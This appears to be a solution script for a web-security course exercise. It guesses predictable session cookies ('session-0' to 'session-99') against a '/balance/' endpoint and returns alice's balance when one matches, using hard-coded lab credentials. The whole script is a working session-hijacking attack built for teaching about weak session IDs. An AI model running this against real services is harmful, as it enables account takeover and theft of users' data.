import sys
import requests
import json


def test_session(address):
    url = address + '/balance/'
    for i in range(100):
        crack = 'session-' + str(i)
        response = requests.get(url, auth=('alice', 'redqueen'),  cookies = {"sessionid": crack})
        data = (json.loads(response.text))
        if data['username'] == 'alice':
            return data['balance']


def main(argv):
	address = sys.argv[1]
	print(test_session(address))


# This makes sure the main function is not called immediatedly
# when TMC imports this module
if __name__ == "__main__": 
	if len(sys.argv) != 2:
		print('usage: python %s address' % sys.argv[0])
	else:
		main(sys.argv)
